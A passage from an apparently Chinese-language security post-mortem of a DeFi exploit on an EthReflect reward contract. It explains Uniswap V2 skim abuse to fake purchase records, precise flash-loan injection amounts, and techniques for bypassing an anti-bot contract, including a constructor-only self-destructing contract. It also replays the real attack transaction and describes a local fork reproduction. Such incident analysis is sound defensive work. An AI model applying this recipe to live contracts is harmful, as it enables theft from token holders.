+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">_pleb</span><span class="p">(</span><span class="n">_sender</span><span class="p">,</span> <span class="n">_recipient</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">_isBuy</span><span class="p">(</span><span class="n">_sender</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">EthReflect</span><span class="p">.</span><span class="n">trackPurchase</span><span class="p">(</span><span class="n">_recipient</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">m_EthReflectAmount</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">EthReflect</span><span class="p">.</span><span class="n">trackSell</span><span class="p">(</span><span class="n">_sender</span><span class="p">,</span> <span class="n">m_EthReflectAmount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">m_EthReflectAmount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p><code>_isBuy(_sender)</code> 即 <code>_sender == m_UniswapV2Pair</code>：<strong>只有&quot;pair 向外部转出代币&quot;这一种转账会触发 trackPurchase</strong>。这是 Uniswap V2 pair 的 <code>swap</code>（买入输出）和 <code>skim</code>（冗余退还）都能满足的形态。</p>
+<h3 class="heading-element" id="42-注入的资本如何完整回收核心"><span>4.2 注入的资本如何完整回收（核心）</span>
+  <a href="#42-%e6%b3%a8%e5%85%a5%e7%9a%84%e8%b5%84%e6%9c%ac%e5%a6%82%e4%bd%95%e5%ae%8c%e6%95%b4%e5%9b%9e%e6%94%b6%e6%a0%b8%e5%bf%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>直接转账灌大余额后，pair 的 <code>reserves</code> 不随转账更新，<code>swap</code> 取回会被 K 校验拦截（双输出时 <code>amount1In</code> 被记为 2X，差 0.3% 无法通过；死池上受 <code>amountOut &lt; reserve</code> 限制）。<strong>灌进去的 X 拿不回来，攻击就不成立</strong>（等于用 X 换 4.5% 的记账）。</p>
+<p>解法是 Uniswap V2 的 <code>skim</code>：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// UniswapV2Pair.sol
+</span></span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">skim</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">)</span> <span class="k">external</span> <span class="n">lock</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">_token0</span> <span class="o">=</span> <span class="n">token0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">_token1</span> <span class="o">=</span> <span class="n">token1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_safeTransfer</span><span class="p">(</span><span class="n">_token0</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">_token0</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)).</span><span class="n">sub</span><span class="p">(</span><span class="n">_reserve0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_safeTransfer</span><span class="p">(</span><span class="n">_token1</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">_token1</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)).</span><span class="n">sub</span><span class="p">(</span><span class="n">_reserve1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p><code>skim</code> 把「余额 − 储备」的冗余原路退还，<strong>且不更新 reserves</strong>。注入 X 后调用 <code>skim(attacker)</code>：</p>
+<ul>
+<li><strong>token0 是币</strong>时：先转出币（<code>sender = pair</code> → 触发 <code>trackPurchase(attacker)</code>，此时 WETH 余额仍含 X，记账 delta = X）→ 再转出 WETH（X 全额回收）；</li>
+<li>完成后 pair 的 reserves 与攻击前完全一致，<strong>净成本 ≈ 0</strong>。</li>
+</ul>
+<p>可打性前提：<strong>pair.token0 必须是币</strong>。token0 = WETH 的 pair 上，skim 先转 WETH（X 已还原）再转币，回调触发时 delta 读数已归零（实测确认此形态不可打）。</p>
+<p>另一个前提是 pair 必须有币的冗余（balance0 &gt; reserve0）。对比攻击块与分析块的链上余额，攻击者<strong>提前几个区块捐了约 1e18 的币</strong>（攻击块 pair 余额比分析块多 0.89e18，恰为 1e18 扣 10% 税后）；实测<strong>任意大于 0 的转账即足以触发回调</strong>（真实攻击中 DIAMND 的 skim 输出仅 320238 wei）。</p>
+<h3 class="heading-element" id="43-提款-cap-的-return-陷阱"><span>4.3 提款 cap 的 return 陷阱</span>
+  <a href="#43-%e6%8f%90%e6%ac%be-cap-%e7%9a%84-return-%e9%99%b7%e9%98%b1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>提款计算 <code>_calcWithdrawable</code>（反编译，AI 重构版）的 else 分支有一个非直觉的 return 逻辑：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">v5</span> <span class="o">=</span> <span class="n">mapping_13</span><span class="p">[</span><span class="n">varg2</span><span class="p">][</span><span class="n">varg1</span><span class="p">];</span>   <span class="c1">// 快照残余
+</span></span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">v6</span> <span class="o">=</span> <span class="n">mapping_12</span><span class="p">[</span><span class="n">varg2</span><span class="p">][</span><span class="n">varg1</span><span class="p">];</span>   <span class="c1">// 当次可提
+</span></span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">v7</span> <span class="o">=</span> <span class="n">_SafeAdd</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">v7</span> <span class="o">&gt;</span> <span class="n">mapping_b</span><span class="p">[</span><span class="n">varg2</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">v5</span> <span class="o">&gt;</span> <span class="n">mapping_b</span><span class="p">[</span><span class="n">varg2</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">v6</span> <span class="o">&gt;</span> <span class="n">mapping_b</span><span class="p">[</span><span class="n">varg2</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">v6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">v5</span><span class="p">;</span>                        <span class="c1">// ← 当 m13 ≤ cap &lt; m12 时返回 m13（≈0），而非 min
+</span></span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">_SafeAdd</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>当&quot;当次可提 m12&quot;超过该 ds 的 cap（mapping_b）时，返回的是快照残余 m13（接近 0）而非 min(可提, cap)。<strong>注入量必须精确落在 m12 ≤ cap 的安全区</strong>：本地复现中 X = 738 安全（提 33.06 ETH），X = 741 则整笔提款归零。攻击者需要按每个 ds 的 alloc 和 m7 系数反推精确注入额。</p>
+<h2 class="heading-element" id="5-反机器人模块与绕过"><span>5. 反机器人模块与绕过</span>
+  <a href="#5-%e5%8f%8d%e6%9c%ba%e5%99%a8%e4%ba%ba%e6%a8%a1%e5%9d%97%e4%b8%8e%e7%bb%95%e8%bf%87" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>所有接入代币共享一个反 bot 实例 <code>0xCD5312d086f078D1554e8813C27Cf6C9D1C3D9b3</code>，在代币 <code>_transfer</code> 中拦截交易（CoinMerge.sol）：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">_isTrade</span><span class="p">(</span><span class="n">_sender</span><span class="p">,</span> <span class="n">_recipient</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">AntiBot</span><span class="p">.</span><span class="n">scanAddress</span><span class="p">(</span><span class="n">_recipient</span><span class="p">,</span> <span class="n">m_UniswapV2Pair</span><span class="p">,</span> <span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span><span class="p">),</span> <span class="s">&#34;Beep Beep Boop, You&#39;re a piece of poop&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">AntiBot</span><span class="p">.</span><span class="n">scanAddress</span><span class="p">(</span><span class="n">_sender</span><span class="p">,</span> <span class="n">m_UniswapV2Pair</span><span class="p">,</span> <span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span><span class="p">),</span>  <span class="s">&#34;Beep Beep Boop, You&#39;re a piece of poop&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">AntiBot</span><span class="p">.</span><span class="n">registerBlock</span><span class="p">(</span><span class="n">_sender</span><span class="p">,</span> <span class="n">_recipient</span><span class="p">,</span> <span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p><code>scanAddress</code> 反编译（AI 重构版）：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">scanAddress</span><span class="p">(</span><span class="kt">address</span> <span class="n">_address</span><span class="p">,</span> <span class="kt">address</span> <span class="n">safeAddress</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_origin</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">hasRequired</span> <span class="o">=</span> <span class="n">_hasRequiredBalance</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span> <span class="c1">// 币合约在 PGreen/PGold 余额 &gt;= stor_4
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hasRequired</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">scanned</span> <span class="o">=</span> <span class="n">_scanAddress</span><span class="p">[</span><span class="n">_address</span><span class="p">]</span> <span class="o">||</span> <span class="n">_scanAddress</span><span class="p">[</span><span class="n">_origin</span><span class="p">];</span>  <span class="c1">// 黑名单
+</span></span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">scanned</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">v3</span> <span class="o">=</span> <span class="n">_isContract</span><span class="p">(</span><span class="n">_address</span><span class="p">);</span>   <span class="c1">// ← 有 code 的地址 → ban
+</span></span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">v3</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">_isSameBlock</span><span class="p">(</span><span class="n">_address</span><span class="p">))</span> <span class="n">v3</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>  <span class="c1">// ← 本区块被 registerBlock 过 → ban
+</span></span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">_isSameBlock</span><span class="p">(</span><span class="n">_origin</span><span class="p">))</span> <span class="n">v3</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">exempt</span> <span class="o">=</span> <span class="n">_address</span> <span class="o">==</span> <span class="n">router</span> <span class="o">||</span> <span class="n">_address</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span>
+</span></span><span class="line"><span class="cl">                   <span class="o">||</span> <span class="n">_address</span> <span class="o">==</span> <span class="n">safeAddress</span> <span class="o">||</span> <span class="n">_address</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                   <span class="o">||</span> <span class="n">mapping_9</span><span class="p">[</span><span class="n">_address</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">exempt</span><span class="p">)</span> <span class="n">v3</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v3</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>三层规则及对应绕过（均在本地复现验证）：</p>
+<ol>
+<li><strong><code>_isContract(_address)</code>：收款方是合约 → ban</strong>。绕过：收款方用&quot;构造中的合约&quot;。攻击合约在 CREATE 构造函数内完成全部操作（收币、触发回调、提款），<strong>构造函数从不 RETURN runtime code，末尾直接 SELFDESTRUCT</strong>。EVM 语义下，代码写入状态树之前，外部对其 <code>EXTCODESIZE/EXTCODEHASH</code> 查询恒为 0——反 bot 视角与&quot;未部署地址&quot;无法区分，检查放行。交易结束账户被完全清空（同交易创建+自毁，Cancun 升级后的旧式全清语义），链上查 code 为空、nonce 为 0，事后无法按地址恢复合约结构。</li>
+<li><strong><code>_isSameBlock</code>：同区块交易过的地址再操作 → ban</strong>。绕过：建立冗余的捐币提前几个区块完成；注入/提款操作与捐币分离，且发起闪贷的 EOA（tx.origin）全程干净。</li>
+<li><strong>外层门槛 <code>_hasRequiredBalance</code></strong>：币合约在 ProjektGreen（<code>0x529bCdD9Dd315be4Bd19E5AC0A82652cDf28fF83</code>）/ ProjektGold（<code>0xDFC628A33C18e856Cd1c59583cB5aCe8dB706F14</code>）持有 ≥ stor_4 余额才启用检查——所有 13 个被攻击的币合约均满足，此门槛不构成阻碍。</li>
+</ol>
+<p>另外攻击者对 13 个 pair 各使用一个新建的一次性合约调用 <code>skim</code>，避免同一调用者的记录污染后续 pair 的操作。</p>
+<h2 class="heading-element" id="6-真实攻击交易复盘"><span>6. 真实攻击交易复盘</span>
+  <a href="#6-%e7%9c%9f%e5%ae%9e%e6%94%bb%e5%87%bb%e4%ba%a4%e6%98%93%e5%a4%8d%e7%9b%98" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>攻击交易完整执行序列（sol-hex trace 导出 + 链上交叉验证）：</p>
+<ol>
+<li>攻击者 EOA 部署攻击合约（交易 <code>to</code> 为空，initcode 6205 字节，构造期完成全部逻辑后自毁）；</li>
+<li>Morpho 闪贷 13,997.8 WETH；</li>
+<li>循环 13 个 pair，每个 pair 重复同一模式（以 DIAMND pair <code>0xd51b4c...</code> 为例，注入 740 ETH）：</li>
+</ol>
+<div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>步骤</th>
+            <th>操作</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>1</td>
+            <td><code>WETH.transfer(pair, 740e18)</code>（注入，抬高现货读数）</td>
+        </tr>
+        <tr>
+            <td>2</td>
+            <td>新建合约调用 <code>pair.skim(攻击合约)</code></td>
+        </tr>
+        <tr>
+            <td>3</td>
+            <td>pair 转出币（<code>sender = pair</code> → <code>scanAddress</code> 放行 → <code>registerBlock</code> → <code>trackPurchase(攻击合约)</code>，记账 delta ≈ 740）</td>
+        </tr>
+        <tr>
+            <td>4</td>
+            <td>pair 转出 WETH 740e18 全额（X 完整回收）</td>
+        </tr>
+        <tr>
+            <td>5</td>
+            <td>回收资金转入路由合约，进入下一个 pair</td>
+        </tr>
+    </tbody>
+  </table>
+</div><ol start="4">
+<li>归还 Morpho 闪贷；</li>
+<li><code>massWithdraw()</code> 提走 301.704684 ETH；</li>
+<li>向区块矿工 <code>0xdaDB0d80178819F2319190D340ce9A924f783711</code> 转账精确 1 ETH（0xde0b6b3a7640000）——构造函数内置的 <code>CALL(COINBASE, 1 ether)</code> 矿工贿赂；真正的 SELFDESTRUCT 受益地址为 <code>0x7bd736631afbe1d3795a94f60574f7fa0ae89347</code>（余额 0.0051 ETH）。</li>
+</ol>
+<p>13 个 pair 的注入额：7565 / 5585 / 11030 / 740 / 5170 / 7100 / 1660 / 2140 / 403 / 440 / 86 / 135 / 60 ETH，全部瞬时回收。全部 <code>scanAddress</code> 调用返回 0（放行），全程无回滚。</p>
+<h2 class="heading-element" id="7-本地复现验证"><span>7. 本地复现验证</span>
+  <a href="#7-%e6%9c%ac%e5%9c%b0%e5%a4%8d%e7%8e%b0%e9%aa%8c%e8%af%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>在 fork（区块 25606411）中复现完整攻击（以 ds1 ProjektDiamond 为例）：</p>
+<ul>
+<li>提前捐币建立 token0 冗余（跨块，绕反 bot 同块记录）；</li>
+<li>Aave V3 flashLoan 借入 740 WETH；</li>
+<li>注入 → <code>skim</code>（收款方为构造期/未部署地址，<code>scanAddress</code> 放行）→ <code>trackPurchase</code> 记账；</li>
+<li>CREATE2 部署收款合约，以自身身份 <code>withdraw</code>；</li>
+<li>X 全额回收，归还闪贷（0.05% 溢价）。</li>
+</ul>
+<p>结果：mapping_b[ds1] 从 33.177 ETH 提空至 0.028 ETH（剩余 &lt; 0.1%），pair WETH 余额还原至 12.05 ETH，闪贷完整归还，全部断言通过。</p>
+<p>分账推算与真实攻击对照：</p>
+<div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>项目</th>
+            <th>数值</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>池子总量</td>
+            <td>400.65 ETH</td>
+        </tr>
+        <tr>
+            <td>Σ mapping_b（28 ds）</td>
